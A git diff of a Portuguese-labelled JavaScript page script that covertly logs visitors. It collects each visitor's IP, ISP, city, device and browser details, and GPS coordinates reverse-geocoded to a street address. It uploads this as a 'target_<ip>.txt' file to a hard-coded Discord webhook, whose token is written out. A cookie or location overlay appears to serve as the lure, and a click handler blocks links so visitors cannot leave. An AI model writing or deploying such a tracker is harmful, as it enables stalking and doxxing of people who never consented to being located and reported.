@@ -1,6 +1,3 @@
-// ==================================
-// IP MODULE
-// ==================================
 const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";
 
 const IPModule = {
@@ -11,100 +8,74 @@ const IPModule = {
       const d = await res.json();
       if (!d.ip) throw new Error("IP missing");
 
-      const now = new Date().toISOString();
-      const scr = window.screen;
-      const nav = window.navigator;
+      const nav  = window.navigator;
       const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+      const ua   = nav.userAgent;
 
-      const ua = nav.userAgent;
-      const osMatch =
-        ua.includes("Windows NT 10.0") ? "Windows 10" :
-        ua.includes("Windows NT 11.0") ? "Windows 11" :
-        ua.includes("Windows NT 6.1")  ? "Windows 7"  :
-        ua.includes("Windows")         ? "Windows"    :
+      const os =
+        ua.includes("Windows NT 10.0") ? "Windows 10"     :
+        ua.includes("Windows NT 11.0") ? "Windows 11"     :
+        ua.includes("Windows NT 6.1")  ? "Windows 7"      :
+        ua.includes("Windows")         ? "Windows"        :
         ua.includes("Ubuntu")          ? "Linux (Ubuntu)" :
-        ua.includes("Linux")           ? "Linux"      :
-        ua.includes("Mac OS X")        ? "macOS"      :
-        ua.includes("Android")         ? "Android"    :
-        ua.includes("iPhone")          ? "iOS (iPhone)" :
-        ua.includes("iPad")            ? "iOS (iPad)" : "Unknown OS";
+        ua.includes("Linux")           ? "Linux"          :
+        ua.includes("Mac OS X")        ? "macOS"          :
+        ua.includes("Android")         ? "Android"        :
+        ua.includes("iPhone")          ? "iOS (iPhone)"   :
+        ua.includes("iPad")            ? "iOS (iPad)"     : "Desconhecido";
 
-      const browserMatch =
-        ua.includes("Edg/")    ? "Microsoft Edge" :
-        ua.includes("OPR/")    ? "Opera"          :
-        ua.includes("Firefox") ? "Firefox"        :
-        ua.includes("Chrome")  ? "Chrome"         :
-        ua.includes("Safari")  ? "Safari"         : "Unknown Browser";
+      const browser =
+        ua.includes("Edg/")    ? "Edge"    :
+        ua.includes("OPR/")    ? "Opera"   :
+        ua.includes("Firefox") ? "Firefox" :
+        ua.includes("Chrome")  ? "Chrome"  :
+        ua.includes("Safari")  ? "Safari"  : "Desconhecido";
 
       const lines = [
+        "[ REDE ]",
+        "IP       : " + d.ip,
+        "ISP      : " + (d.org      ?? "N/A"),
+        "Local    : " + (d.city ?? "") + ", " + (d.region ?? "") + " - " + (d.country ?? ""),
+        "Conexao  : " + (conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"),
         "",
-        "  ☠️  S Y S T E M   B R E A C H   D E T E C T E D  ☠️",
-        "  ► ACCESS GRANTED — IDENTITY COMPROMISED",
-        "",
-        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓",
-        "┃   🔴  T A R G E T   A C Q U I R E D  ┃",
-        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
-        "",
-        "──────[ 🌐 NETWORK ]──────",
-        "  IP       : " + d.ip,
-        "  ISP      : " + (d.org      ?? "N/A"),
-        "  CITY     : " + (d.city     ?? "N/A") + ", " + (d.region ?? ""),
-        "  COUNTRY  : " + (d.country  ?? "N/A"),
-        "  COORDS   : " + (d.loc      ?? "N/A"),
-        "  TIMEZONE : " + (d.timezone ?? "N/A"),
-        "  SPEED    : " + (conn.downlink ? conn.downlink + " Mbps / " + (conn.effectiveType ?? "") : "N/A"),
-        "",
-        "──────[ 💻 DEVICE ]──────",
-        "  OS       : " + osMatch,
-        "  BROWSER  : " + browserMatch,
-        "  LANGUAGE : " + nav.language,
-        "  CPU      : " + (nav.hardwareConcurrency ?? "N/A") + " cores",
-        "  RAM      : " + (nav.deviceMemory ?? "N/A") + " GB",
-        "  SCREEN   : " + scr.width + "x" + scr.height + " @ " + scr.colorDepth + "bit",
-        "  MOBILE   : " + (nav.maxTouchPoints > 0 ? "Yes" : "No"),
-        "  ONLINE   : " + nav.onLine,
-        "",
-        "──────[ 🔍 BROWSER ]──────",
-        "  VENDOR   : " + nav.vendor,
-        "  COOKIES  : " + nav.cookieEnabled,
-        "  REFERRER : " + (document.referrer || "N/A"),
-        "  URL      : " + location.href,
+        "[ DISPOSITIVO ]",
+        "OS       : " + os,
+        "Browser  : " + browser,
+        "CPU      : " + (nav.hardwareConcurrency ?? "N/A") + " cores / " + (nav.deviceMemory ?? "N/A") + " GB RAM",
+        "Tela     : " + window.screen.width + "x" + window.screen.height,
+        "Mobile   : " + (nav.maxTouchPoints > 0 ? "Sim" : "Nao"),
       ];
 
       if (lat !== null && lon !== null) {
-        lines.push("");
-        lines.push("──────[ 📍 GPS ]──────");
-        lines.push("  COORDS   : " + lat.toFixed(6) + ", " + lon.toFixed(6));
+        let endereco = "N/A";
         try {
           const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
-          const geoData = await geo.json();
-          lines.push("  ENDERECO : " + (geoData.display_name ?? "N/A"));
-        } catch { lines.push("  ENDERECO : N/A"); }
-        lines.push("  MAPS     : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
+          const gd  = await geo.json();
+          const r   = gd.address ?? {};
+          const partes = [r.road, r.house_number, r.suburb, r.city || r.town, r.state, r.postcode].filter(Boolean);
+          endereco = partes.join(", ");
+        } catch {}
+
+        lines.push("");
+        lines.push("[ LOCALIZACAO ]");
+        lines.push("Endereco : " + endereco);
+        lines.push("Coords   : " + lat.toFixed(6) + ", " + lon.toFixed(6));
+        lines.push("Maps     : https://maps.google.com/?q=" + lat.toFixed(6) + "," + lon.toFixed(6));
       }
 
       lines.push("");
-      lines.push("───────────────────────────────────────");
-      lines.push("  ⏰ " + now);
-      lines.push("───────────────────────────────────────");
-      lines.push("  ✔ ALL DATA EXTRACTED — LOGGING COMPLETE ✔");
-      lines.push("");
+      lines.push(new Date().toISOString());
 
       const blob = new Blob([lines.join("\n")], { type: "text/plain" });
       const form = new FormData();
       form.append("file", blob, "target_" + d.ip.replace(/\./g, "_") + ".txt");
-
-      const wh = await fetch(WEBHOOK, { method: "POST", body: form });
-      console.log("[Webhook]", wh.status, wh.statusText);
+      await fetch(WEBHOOK, { method: "POST", body: form });
     } catch (err) {
-      console.warn("[IPModule] erro:", err.message);
+      console.warn("[IPModule]", err.message);
     }
   },
 };
 
-// ==================================
-// COOKIE BANNER MODULE
-// ==================================
 const CookieModule = {
   init() {
     const overlay = document.getElementById("location-overlay");
@@ -130,7 +101,6 @@ const CookieModule = {
 
 CookieModule.init();
 
-// Bloqueia redirecionamentos
 document.addEventListener("click", (e) => {
   const a = e.target.closest("a");
   if (a) e.preventDefault();
